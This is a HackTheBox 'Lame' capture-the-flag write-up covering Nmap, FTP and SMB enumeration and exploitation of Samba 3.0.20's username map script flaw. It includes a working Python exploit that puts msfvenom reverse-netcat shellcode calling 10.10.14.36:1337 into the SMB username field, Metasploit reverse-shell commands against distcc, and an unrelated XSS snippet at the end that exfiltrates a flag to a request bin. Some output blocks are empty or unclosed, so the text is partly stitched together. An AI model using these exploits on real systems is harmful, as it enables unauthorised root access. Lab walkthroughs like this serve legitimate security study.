Since there is one extra port open, I am going to run a scan similar to the initial Nmap TCP scan to enumerate the service version and perform a script scan, but only against this single port by using the `-p` flag to specify a port.

## Nmap scan of port 3632

```zsh
nmap -sC -sV -p 3632 10.10.10.3

## Thoughts based on Nmap scans:

### FTP - 21

Going down the list of open ports, the first port we have is `port 21 FTP`. This port has `Anonymous FTP login allowed`, which means that we can use an anonymous user to access FTP file shares. The Nmap scan also shows that this FTP server is running `vsftpd 2.3.4`. It is always a good habit to just do a quick Google search of "vsftpd 2.3.4 exploit" or something relevant if you have a service and a version number. Looking on Google, we can see that [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) has a post about vsftpd 2.3.4 having backdoor command execution which seems pretty enticing so we will definitely keep this in mind when we start exploiting things. 

### SSH - 22

Whenever I see SSH, this is most likely one of the services I will not look into right off the bat besides searching for a possible vulnerable version. The reason for this is we need credentials. Sure, there is a chance that we may be able to bruteforce our way in, but we still need a username at the least. The only username we could try on is the `root` user account but that probably won't do us any good. This does not mean though that this port will not be looked into in the future. Let's say for example that we enumerate FTP and find that there are credentials in there. We could start using those credentials everywhere we can to see if they are valid. Even if they are not, keep those in mind... maybe someone else used the same password?

### SMB 139/445

SMB will definitely be a good port to look into to check for common misconfigurations. Are there null sessions allowed? Null sessions could lead to potential file/information disclosure which can be used to maybe SSH into the server or log into a user using FTP. Is SMB patched? There may be exploits that can be used against it similar to the blog post I wrote on the HackTheBox [Legacy](https://blauersec.com/hack the box/2021/05/24/htb-legacy.html). Maybe we are able to read/write files in an SMB share? This could lead to potential file downloads/uploads/execution, etc. similar to FTP. 

### DistCC Daemon - 3632

distccd is the DistCC Daemon. distccd is the server for the distcc distributed compiler. It accepts and runs compilation jobs for network clients [(More info on distccd can be found on the man page of distccd)](https://linux.die.net/man/1/distccd). Similar to FTP, since Nmap did displayy a version number to this service, there is another post by [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/) talking about command execution for the DistCC Daemon so we will also keep that in mind. Due to my lack of knowledge in the DistCC Daemon as of right now, this will probably be one of the last ports I attempt to enumerate. If it comes to that point where I need to interact with the DistCC Daemon then it will be a pretty fun learning experience.

## FTP - 22 Enumeration

First, let's go ahead and try to see if we can login as an anonymous user.

```
ftp 10.10.10.3
```

```
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:bri5ee): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

And we were successfully able to login as an anonymous user! Simply typing the user as `anonymous` and typing any password in gained us access to the FTP share.

Let's see if there is anything interesting in the FTP share we are in as an anonymous user.

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

And... nothing. Let's see if we can use the `PUT` command to put files into this FTP share. For this, I'm going to exit out of the FTP share, make a file using the `touch` command and then seeing if I can put that into the FTP share. Note that when putting file into an FTP with the `PUT` command, it will be grabbing files from the directory you were in when you connected to the FTP server.

```
┌──(root@kali)-[~/htb/lame]
└─# touch test_ftp_file

┌──(root@kali)-[~/htb/lame]
└─# ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:bri5ee): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files
ftp> put test_ftp_file
local: test_ftp_file remote: test_ftp_file
200 PORT command successful. Consider using PASV.
553 Could not create file.
```

So we can't use the PUT command. Good to note down. I do not think this would have led us anywhere important regardless. The reason for this is because let's imagine there is an FTP server and there is also a web server being hosted on port 80. What if this web server was also hosting the FTP shares? This means we could use this `PUT` command to stick a reverse shell into the FTP share, navigate to that file on the web server and set up a netcat listener to catch a shell back. But since there is no web server, there isn't really much we can do with my knowledge of FTP exploits.

## FTP - 22 Attempting Exploitation

It was mentioned that this vsftpd version is vulnerable to backdoor command execution. For simplicity, I am going to see if this even works by using the vsftpd 2.3.4 Metasploit Framework module. 

```
msfconsole
```

```

I opened up `msfconsole`, used the `search` command to search for `vsftpd 2.3.4`. Once I found the module, you can simply type `use #` where `#` represents the number correlating to what was shown on the search command. In this case, it was `0` so `use 0`. I typed `options` to see what was needed for the exploit to work which was just `RHOSTS` which is the remote host aka the target we are attacking. I go ahead and run the `exploit` command nd the exploit doesn't work. Kind of a bummer. We can try this exploit again if for some reason it just wasn't working at this point but let's move on for now.

## SMB - 139/445 Enumeration

To start off my enumeration of SMB, I first like to run scans. This is a really good habit to get into as scans can just run in the background while you do more manual testing. I am going to run a basic SMB enumeration using NMAP NSE scripts to scan for any potentialvulnerabilities and to gather more information. 

```
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p139,445 -oA enum_smb -T4 -v 10.10.10.3 -d --stats-every 10s
```

Something interesting we can see from this output is that there are two shares that we can enumerate further into due to null sessions with SMB being allowed: there is anonymous READ/WRITE access to the `tmp` directory and `IPC$` directory. The `tmp` directory caches my eye the most because the comment says `oh noes!`. May be a rabbit hole but we will see. We can also begin searching if this SMB version which is running `Samba 3.0.20-Debian` is vulnerable.

### Enumerating the tmp directory

We can enumerate SMB shares using `smbclient` which is an ftp-like client to access SMB/CIFS resources on servers.

```
smbclient \\\\10.10.10.3\\tmp -N
```

We input the IP address and the directory we want to access as well as the `-N` flag as this will use no password which is what anonymous users use anyways. Once we login, we can use a `dir` command to see the contents within the `tmp` directory

```
Anonymous login successful
Try "help" to get a list of possible commands.

You can grab these files and put them onto your host by using the `get` command within smbclient. Going through each directory and grabbing the files and looking through them did not supply any information. I'm going to see if possibly this version is vulnerable to anything by doing a Google search.

## SMB - 139/445 Exploitation | Samba "username map script" Command Execution

Looking on Google by typing "Samba 3.0.20 exploit", I found a [Rapid7](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) post about an exploit through the "username map script" configuration option within Samba. Since this also matches our version of Samba, I am going to test out this module. According to Rapid7, the description of this exploit is the following: This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!"

There is a Metasploit Framework module already for this exploit so let's use `msfconsole` again.

```
msfconsole
```

Using this Metasplot module we get a root command shell! To practice for the OSCP exam, I will be doing this manually as well. 

## SMB - 139/445 Exploitation Manually

Looking back at the Rapid7 post, it mentions that "by specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!" This means that all we need to do is implement some shellcode into the username field when connecting to the SMB server. A great way to do this is to utilize Python. I went ahead and wrote a Python script and added some comments to explain what is happening in this script.

```python
#!/usr/bin/python3

#Import SMBConnection Module (uses pysmb to perform file operations with a remote SMB/CIFS server)
from smb.SMBConnection import SMBConnection

#msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.36 LPORT=1337 -f python
#This msfvenom command will output shellcode for a Unix reverse netcat calling to host 10.10.14.36 on port 1337.
#Shellcode is simply a series of bytes that represent executable machine language code. These bytes are represented in hex notation.
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x62"
buf += b"\x73\x76\x6f\x65\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31"
buf += b"\x30\x2e\x31\x34\x2e\x33\x36\x20\x31\x33\x33\x37\x20"
buf += b"\x30\x3c\x2f\x74\x6d\x70\x2f\x62\x73\x76\x6f\x65\x20"
buf += b"\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74"
buf += b"\x6d\x70\x2f\x62\x73\x76\x6f\x65\x20\x32\x3e\x26\x31"
buf += b"\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x62\x73\x76"
buf += b"\x6f\x65"

#Username supplied is gonna be the nohup command (used to tell Unix systems not to stop a command once it has started this will be useful for the shellcode which is going to run a command
#Then we concatenate the nohup command with our shellcode we want to execute. We also supply and empty password and our target_ip which is 10.10.10.3
username = "/=`nohup " + buf + "`"
password = ""
target_ip = '10.10.10.3'

#Using the SMBConnection class which requires (userID, password, client_machine_name, server_name, use_ntlm_v2 (boolean value)
#We do not need to supply actual values for client_machine_name and server_name and can set use_ntlm_v2 to false since these are not needed.
connection = SMBConnection(username, password, "Temp1", "Temp2", use_ntlm_v2 = False)
#Establish an SMB connection using .connect(target_ip, port# (445))
connection.connect(target_ip, 445)
```

All we need to do now is setup a netcat listener on port 1337 using `nc -lvnp 1337` and run our python script by simply doing `python [name_of_script].py` 

```
nc -lvnp 1337
```

```
python samba-3.0.20-exploit.py 
```

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.3] 50439
id
uid=0(root) gid=0(root)
```

And again we have a root shell!

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

msf6 > use 0
msf6 exploit(unix/misc/distcc_exec) > set payload payload/cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf6 exploit(unix/misc/distcc_exec) > set lhost 10.10.14.36
lhost => 10.10.14.36
msf6 exploit(unix/misc/distcc_exec) > set rhost 10.10.10.3
rhost => 10.10.10.3
msf6 exploit(unix/misc/distcc_exec) > exploit

And... Nothing as well. Seems like SMB was the path to get to root for this box. Overall was a pretty fun box to exploit manually!

```python
def get_flag(request_bin):
    # Prepare the payload to send a GET request
    xml_http_request = 'var xmlHttp = new XMLHttpRequest();xmlHttp.open(\\"GET\\",\\"/alien\\",false);xmlHttp.send();'

    # Extracting the flag
    xml_http_flag = 'let flag = xmlHttp.responseText.substring((xmlHttp.responseText).search(\\"CHTB{\\"),(xmlHttp.responseText).search(\\"}\\")+1);'
    
    # Crafting the exfiltration url
    exfil_request = xml_http_flag + 'document.location=\\"' + request_bin + '\\" + flag'

    # Submitting the payload
    execute_xss(xml_http_request + exfil_request)
```
